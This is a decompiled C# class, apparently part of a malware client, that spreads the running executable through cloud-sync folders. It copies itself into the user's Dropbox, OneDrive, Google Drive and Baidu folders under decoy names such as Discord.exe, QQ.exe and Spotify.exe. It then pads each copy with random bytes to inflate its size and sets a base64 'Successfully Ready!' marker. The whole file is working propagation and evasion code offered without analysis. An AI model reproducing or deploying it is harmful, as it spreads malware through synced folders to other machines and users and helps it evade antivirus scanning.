using System;
using System.IO;
using A;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns20;

namespace Client;

public class C_DRPB
{
	public static object object_0 = Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE"), "Dropbox");

	public static object object_1 = Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE"), "OneDrive");

	public static object object_2 = Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE"), "Google Drive");

	public static object object_3 = Path.Combine(Environment.GetEnvironmentVariable("APPDATA"), "BaiduYunKernel");

	public static Random random_0 = new Random();

	public static string[] string_0 = new string[12]
	{
		"Tencent.exe", "QQ Phone Manager.exe", "iFunBox.exe", "QQ.exe", "Adobe Photoshop CS.exe", "Amazon Music.exe", "Microsoft Teams.exe", "Discord.exe", "Spotify.exe", "Slack.exe",
		"Flock.exe", "Toggle Track.exe"
	};

	public static object object_4 = string_0[(int)Math.Round(VBMath.Rnd() * (float)(string_0.Length - 1))];

	public static void smethod_0()
	{
		smethod_1();
		A();
		a();
		B();
	}

	public static object smethod_1()
	{
		object result = default(object);
		try
		{
			Random random = new Random();
			VBMath.Randomize();
			string text = string_0[(int)Math.Round(VBMath.Rnd() * (float)(string_0.Length - 1))];
			int num = random.Next(100000000, 600000000);
			if (Operators.CompareString(global::A.C.b("FileD"), (string)null, false) == 0)
			{
				if (Operators.ConditionalCompareObjectEqual(b(), (object)false, false))
				{
					if (File.Exists(Path.Combine(Conversions.ToString(object_0), text)))
					{
						File.Delete(Path.Combine(Conversions.ToString(object_0), text));
					}
					File.Copy(Conversions.ToString(GClass20.object_0), Path.Combine(Conversions.ToString(object_0), text), overwrite: true);
					A(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(object_0, (object)"\\"), (object)text)), num, bool_0: true);
					global::A.C.a("FileD", "U3VjY2Vzc2Z1bGx5IFJlYWR5IQ==");
				}
				result = true;
				return result;
			}
			result = false;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private static object A()
	{
		object result = default(object);
		try
		{
			Random random = new Random();
			VBMath.Randomize();
			string text = string_0[(int)Math.Round(VBMath.Rnd() * (float)(string_0.Length - 1))];
			int num = random.Next(10000000, 200000000);
			if (Operators.CompareString(global::A.C.b("FileO"), (string)null, false) == 0)
			{
				if (Operators.ConditionalCompareObjectEqual(C(), (object)false, false))
				{
					if (File.Exists(Path.Combine(Conversions.ToString(object_1), text)))
					{
						File.Delete(Path.Combine(Conversions.ToString(object_1), text));
					}
					File.Copy(Conversions.ToString(GClass20.object_0), Path.Combine(Conversions.ToString(object_1), text), overwrite: true);
					A(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(object_1, (object)"\\"), (object)text)), num, bool_0: true);
					global::A.C.a("FileO", "U3VjY2Vzc2Z1bGx5IFJlYWR5IQ==");
				}
				result = true;
				return result;
			}
			result = false;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private static object a()
	{
		object result = default(object);
		try
		{
			Random random = new Random();
			VBMath.Randomize();
			string text = string_0[(int)Math.Round(VBMath.Rnd() * (float)(string_0.Length - 1))];
			int num = random.Next(10000000, 800000000);
			if (Operators.CompareString(global::A.C.b("FileG"), (string)null, false) == 0)
			{
				if (Operators.ConditionalCompareObjectEqual(c(), (object)false, false))
				{
					if (File.Exists(Path.Combine(Conversions.ToString(object_2), text)))
					{
						File.Delete(Path.Combine(Conversions.ToString(object_2), text));
					}
					File.Copy(Conversions.ToString(GClass20.object_0), Path.Combine(Conversions.ToString(object_2), text), overwrite: true);
					A(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(object_2, (object)"\\"), (object)text)), num, bool_0: true);
					global::A.C.a("FileG", "U3VjY2Vzc2Z1bGx5IFJlYWR5IQ==");
				}
				result = true;
				return result;
			}
			result = false;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private static object B()
	{
		object result = default(object);
		try
		{
			Random random = new Random();
			VBMath.Randomize();
			string text = string_0[(int)Math.Round(VBMath.Rnd() * (float)(string_0.Length - 1))];
			int num = random.Next(10000000, 400000000);
			if (Operators.CompareString(global::A.C.b("FileB"), (string)null, false) == 0)
			{
				if (Operators.ConditionalCompareObjectEqual(D(), (object)false, false))
				{
					if (File.Exists(Path.Combine(Conversions.ToString(object_3), text)))
					{
						File.Delete(Path.Combine(Conversions.ToString(object_3), text));
					}
					File.Copy(Conversions.ToString(GClass20.object_0), Path.Combine(Conversions.ToString(object_3), text), overwrite: true);
					A(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(object_3, (object)"\\"), (object)text)), num, bool_0: true);
					global::A.C.a("FileB", "U3VjY2Vzc2Z1bGx5IFJlYWR5IQ==");
				}
				result = true;
				return result;
			}
			result = false;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private static object b()
	{
		if (!Directory.Exists(Conversions.ToString(object_0)))
		{
			return false;
		}
		return false;
	}

	private static object C()
	{
		if (!Directory.Exists(Conversions.ToString(object_1)))
		{
			return false;
		}
		return false;
	}

	private static object c()
	{
		if (!Directory.Exists(Conversions.ToString(object_2)))
		{
			return false;
		}
		return false;
	}

	private static object D()
	{
		if (!Directory.Exists(Conversions.ToString(object_3)))
		{
			return false;
		}
		return false;
	}

	private static void A(string string_1, long long_0, bool bool_0)
	{
		long length = new FileInfo(string_1).Length;
		if (length < long_0)
		{
			long num = long_0 - length;
			byte[] array = new byte[(int)(num - 1L) + 1];
			if (bool_0)
			{
				Random random = new Random((int)long_0);
				random.NextBytes(array);
			}
			using FileStream fileStream = new FileStream(string_1, FileMode.Append, FileAccess.Write);
			fileStream.Write(array, 0, array.Length);
			fileStream.Flush();
		}
	}
}
